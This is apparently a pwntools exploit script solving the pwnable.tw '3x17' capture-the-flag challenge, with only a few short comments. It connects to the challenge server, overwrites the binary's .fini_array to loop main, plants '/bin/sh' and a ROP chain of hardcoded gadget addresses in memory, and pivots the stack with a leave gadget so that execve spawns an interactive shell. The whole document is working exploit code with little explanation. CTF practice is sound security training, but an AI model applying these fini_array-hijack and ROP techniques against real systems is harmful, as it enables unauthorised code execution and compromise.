from pwn import *

# io = process("./3x17")
io = remote("chall.pwnable.tw", 10105) 

main_at = 0x0000000000401B6D
dtor_at = 0x0000000000402960
fini_array_at = 0x00000000004B40F0
dstack_at = 0x00000000004B4100	# dummy stack
bin_sh_at = 0x00000000004B70E0
leave_at = 0x0000000000472bbf

""" rop chaining
0x0000000000401696 : pop rdi ; ret
0x00000000004B70E0	; /bin/sh
0x0000000000406c30 : pop rsi ; ret
0
0x0000000000446e35 : pop rdx ; ret
0
0x000000000041e4af : pop rax ; ret
0x3b	; sys_execve
0x00000000004022b4 : syscall
"""

def write_at(addr, data):
	io.sendlineafter("addr:", str(addr))
	io.sendafter("data:", data)

# bypass check in main
write_at(fini_array_at,  p64(dtor_at) + p64(main_at))
write_at(bin_sh_at, "/bin/sh\x00")
write_at(dstack_at + 0x00, p64(0x0000000000401696) + p64(bin_sh_at))
write_at(dstack_at + 0x10, p64(0x0000000000406c30) + p64(0))
write_at(dstack_at + 0x20, p64(0x0000000000446e35) + p64(0))
write_at(dstack_at + 0x30, p64(0x000000000041e4af) + p64(0x3b))
write_at(dstack_at + 0x40, p64(0x00000000004022b4))	

write_at(fini_array_at,  p64(leave_at))	# why leave, due to rbp holds the start of fini_array section so just to make rsp having that value.

io.interactive()
